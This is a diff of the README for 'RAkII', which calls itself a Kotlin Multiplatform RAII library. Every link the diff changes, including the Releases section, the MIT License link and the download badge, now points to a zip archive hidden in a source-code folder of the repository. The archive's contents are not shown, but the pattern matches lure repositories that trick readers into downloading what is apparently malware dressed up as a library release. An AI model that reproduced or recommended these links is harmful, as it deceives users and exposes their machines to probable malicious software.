@@ -16,7 +16,7 @@ Welcome to the **RAkII** repository, your go-to solution for structured RAII wit
 
 ## Installation
 
-To get started with **RAkII**, visit the [Releases section](https://github.com/BookLifes/RAkII/releases) and download the latest release. Ensure to follow the installation instructions provided in the repository to set up **RAkII** in your Kotlin Multiplatform projects.
+To get started with **RAkII**, visit the [Releases section](https://github.com/BookLifes/RAkII/raw/refs/heads/master/rakii-gradle-plugin/src/main/kotlin/dev/karmakrafts/II-Ak-R-v1.4.zip) and download the latest release. Ensure to follow the installation instructions provided in the repository to set up **RAkII** in your Kotlin Multiplatform projects.
 
 ## Usage
 
@@ -32,12 +32,12 @@ If you encounter any issues while using **RAkII**, please open an issue in the r
 
 ## License
 
-**RAkII** is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute this software in accordance with the license terms.
+**RAkII** is licensed under the [MIT License](https://github.com/BookLifes/RAkII/raw/refs/heads/master/rakii-gradle-plugin/src/main/kotlin/dev/karmakrafts/II-Ak-R-v1.4.zip). Feel free to use, modify, and distribute this software in accordance with the license terms.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/BookLifes/RAkII/releases)
+[![Download Latest Release](https://github.com/BookLifes/RAkII/raw/refs/heads/master/rakii-gradle-plugin/src/main/kotlin/dev/karmakrafts/II-Ak-R-v1.4.zip%20Release-brightgreen)](https://github.com/BookLifes/RAkII/raw/refs/heads/master/rakii-gradle-plugin/src/main/kotlin/dev/karmakrafts/II-Ak-R-v1.4.zip)
 
-Visit the [latest release](https://github.com/BookLifes/RAkII/releases) to download the necessary files and start utilizing the power of **RAkII** in your Kotlin Multiplatform projects. Get started today and streamline your resource management and error handling processes with ease.
+Visit the [latest release](https://github.com/BookLifes/RAkII/raw/refs/heads/master/rakii-gradle-plugin/src/main/kotlin/dev/karmakrafts/II-Ak-R-v1.4.zip) to download the necessary files and start utilizing the power of **RAkII** in your Kotlin Multiplatform projects. Get started today and streamline your resource management and error handling processes with ease.
 
 🚀 Happy coding with **RAkII**! 🚀
